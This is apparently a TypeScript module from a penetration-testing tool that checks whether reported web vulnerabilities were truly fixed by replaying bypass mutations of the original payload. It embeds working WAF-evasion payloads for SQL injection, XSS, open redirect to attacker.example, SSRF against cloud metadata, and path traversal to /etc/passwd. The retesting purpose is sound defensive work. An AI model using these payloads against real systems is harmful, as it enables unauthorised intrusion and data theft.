/**
 * Remediation verifier — decide whether a fixed finding is REALLY fixed.
 *
 * The trick: an attacker who patched based on the exact payload that was
 * reported will often have only blocked that one string. So we re-run the
 * finding through a family of bypass mutations of the ORIGINAL payload and
 * watch for the vulnerability signature again. Any surviving variant means
 * the fix is a blocklist, not a fix.
 *
 * Pure functions only — the caller supplies HTTP responses; nothing here
 * touches the network. Logic reimplemented in T3MP3ST style from Shannon's
 * services/remediation-verifier.ts (Keygraph, AGPL-3.0).
 */

export type VulnClass = 'sqli' | 'xss' | 'open-redirect' | 'ssrf' | 'idor' | 'path-traversal';

/** The finding under retest, reduced to what variant generation needs. */
export interface OriginalFinding {
  readonly id: string;
  readonly vulnClass: VulnClass;
  readonly originalPayload: string;
}

/** One mutation of the original payload worth replaying. */
export interface BypassVariant {
  readonly findingId: string;
  readonly label: string;
  readonly mutated: string;
  readonly rationale: string;
}

/** What came back when a variant was replayed. */
export interface VariantResponse {
  readonly findingId: string;
  readonly label: string;
  readonly status: number;
  readonly responseBody: string;
  readonly elapsedMs: number;
}

export type VerificationVerdict = 'fully-remediated' | 'partial-bypass' | 'not-remediated';

export interface VerificationResult {
  readonly findingId: string;
  readonly verdict: VerificationVerdict;
  readonly bypassedVariants: readonly string[];
  readonly evidence: readonly string[];
}

/** Build the ordered, stable mutation set for a finding's vuln class. */
export function generateVariants(finding: OriginalFinding): readonly BypassVariant[] {
  switch (finding.vulnClass) {
    case 'sqli': return sqliVariants(finding);
    case 'xss': return xssVariants(finding);
    case 'open-redirect': return openRedirectVariants(finding);
    case 'ssrf': return ssrfVariants(finding);
    case 'idor': return idorVariants(finding);
    case 'path-traversal': return pathTraversalVariants(finding);
  }
}

const SQL_ERROR = /\b(SQL syntax|ORA-\d{5}|mysql_fetch|PG::SyntaxError)\b/i;
const XSS_REFLECT = /<svg|onerror=|<script|<img/i;

/** Judge a round of variant replays: which survived, and what the fix really did. */
export function classifyResults(
  finding: OriginalFinding,
  responses: readonly VariantResponse[],
): VerificationResult {
  const bypassed: string[] = [];
  const evidence: string[] = [];

  for (const r of responses) {
    let hit = false;
    let why = '';
    switch (finding.vulnClass) {
      case 'sqli':
        if (SQL_ERROR.test(r.responseBody)) {
          hit = true;
          why = 'SQL error reflected';
        } else if (r.elapsedMs >= 4500) {
          hit = true;
          why = `time delay ${r.elapsedMs}ms`;
        }
        break;
      case 'xss':
        if (XSS_REFLECT.test(r.responseBody)) {
          hit = true;
          why = 'mutated XSS payload reflected';
        }
        break;
      case 'open-redirect':
        if (r.status >= 300 && r.status < 400) {
          hit = true;
          why = `3xx redirect (${r.status})`;
        }
        break;
      case 'ssrf':
        if (r.responseBody.includes('169.254.169.254') || r.responseBody.includes('Metadata-Flavor')) {
          hit = true;
          why = 'metadata-service indicator';
        }
        break;
      case 'idor':
        if (r.status === 200 && r.responseBody.length > 0) {
          hit = true;
          why = '200 on cross-tenant id';
        }
        break;
      case 'path-traversal':
        if (r.responseBody.includes('root:x:') || r.responseBody.includes('[boot loader]')) {
          hit = true;
          why = 'OS file read';
        }
        break;
    }
    if (hit) {
      bypassed.push(r.label);
      evidence.push(`${r.label}: ${why}`);
    }
  }

  const verdict: VerificationVerdict =
    bypassed.length === 0
      ? 'fully-remediated'
      : bypassed.length < responses.length
        ? 'partial-bypass'
        : 'not-remediated';

  return { findingId: finding.id, verdict, bypassedVariants: bypassed, evidence };
}

function sqliVariants(f: OriginalFinding): readonly BypassVariant[] {
  return [
    {
      findingId: f.id,
      label: 'comment-injection',
      mutated: `${f.originalPayload}/**/`,
      rationale: 'inline comment to defeat keyword blocklist',
    },
    {
      findingId: f.id,
      label: 'case-flip',
      mutated: f.originalPayload.replace(/select/gi, 'SeLeCt').replace(/union/gi, 'UnIoN'),
      rationale: 'case toggling vs case-sensitive deny list',
    },
    {
      findingId: f.id,
      label: 'double-url-encode',
      mutated: encodeURIComponent(encodeURIComponent(f.originalPayload)),
      rationale: 'double-decode behind a normalising WAF',
    },
    {
      findingId: f.id,
      label: 'unicode-equiv',
      mutated: f.originalPayload.replace(/'/g, '\u2019'),
      rationale: 'unicode look-alike for quote',
    },
    {
      findingId: f.id,
      label: 'time-delay',
      mutated: `'; SELECT pg_sleep(6) -- `,
      rationale: 'fall back to OOB / time-based when in-band blocked',
    },
  ];
}

function xssVariants(f: OriginalFinding): readonly BypassVariant[] {
  return [
    {
      findingId: f.id,
      label: 'svg-onload',
      mutated: '<svg onload=alert(1)>',
      rationale: 'svg vector vs <script> blocklist',
    },
    {
      findingId: f.id,
      label: 'event-handler',
      mutated: '"autofocus onfocus=alert(1) x="',
      rationale: 'attribute-context break-out',
    },
    {
      findingId: f.id,
      label: 'html-entity',
      mutated: f.originalPayload.replace(/</g, '&#60;'),
      rationale: 'entity decode bypass',
    },
    {
      findingId: f.id,
      label: 'comment-split',
      mutated: '<scr<!---->ipt>alert(1)</scr<!---->ipt>',
      rationale: 'HTML-comment inline split',
    },
  ];
}

function openRedirectVariants(f: OriginalFinding): readonly BypassVariant[] {
  return [
    {
      findingId: f.id,
      label: 'protocol-relative',
      mutated: '//attacker.example',
      rationale: 'browser treats as same-protocol absolute',
    },
    {
      findingId: f.id,
      label: 'unicode-host',
      mutated: 'https://attacker.example\u2024foo',
      rationale: 'unicode pseudo-host bypass',
    },
    {
      findingId: f.id,
      label: 'userinfo-trick',
      mutated: 'https://victim.example@attacker.example',
      rationale: 'userinfo segment hides true host',
    },
    {
      findingId: f.id,
      label: 'embedded-cr',
      mutated: `${f.originalPayload}%0d%0aLocation:%20https://attacker.example`,
      rationale: 'CRLF header injection variant',
    },
  ];
}

function ssrfVariants(f: OriginalFinding): readonly BypassVariant[] {
  return [
    {
      findingId: f.id,
      label: 'dec-encoded-ip',
      mutated: 'http://2852039166/latest/meta-data/',
      rationale: '169.254.169.254 in decimal form',
    },
    {
      findingId: f.id,
      label: 'hex-encoded-ip',
      mutated: 'http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/',
      rationale: '169.254.169.254 in hex form',
    },
    {
      findingId: f.id,
      label: 'dns-rebind',
      mutated: 'http://nip.io.169.254.169.254.nip.io/',
      rationale: 'wildcard DNS that resolves to link-local',
    },
    {
      findingId: f.id,
      label: 'localhost-ipv6',
      mutated: 'http://[::1]/',
      rationale: 'ipv6 loopback as alternate localhost form',
    },
  ];
}

function idorVariants(f: OriginalFinding): readonly BypassVariant[] {
  return [
    {
      findingId: f.id,
      label: 'id-decrement',
      mutated: `${Number(f.originalPayload) - 1}`,
      rationale: 'walk down id space',
    },
    {
      findingId: f.id,
      label: 'id-uuid-swap',
      mutated: '00000000-0000-0000-0000-000000000001',
      rationale: 'try sentinel uuid',
    },
    {
      findingId: f.id,
      label: 'tenant-prefix-strip',
      mutated: f.originalPayload.replace(/^[a-z0-9-]+_/i, ''),
      rationale: 'remove tenant prefix',
    },
  ];
}

function pathTraversalVariants(f: OriginalFinding): readonly BypassVariant[] {
  return [
    {
      findingId: f.id,
      label: 'double-dot-encoded',
      mutated: '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      rationale: 'percent-encoded dots',
    },
    {
      findingId: f.id,
      label: 'utf8-overlong',
      mutated: '..%c0%af..%c0%afetc/passwd',
      rationale: 'overlong UTF-8 slash',
    },
    {
      findingId: f.id,
      label: 'windows-traversal',
      mutated: '..\\\\..\\\\windows\\\\win.ini',
      rationale: 'backslash separator for Windows hosts',
    },
    {
      findingId: f.id,
      label: 'nullbyte-suffix',
      mutated: '../../../../etc/passwd%00.png',
      rationale: 'null-byte to truncate suffix check',
    },
  ];
}
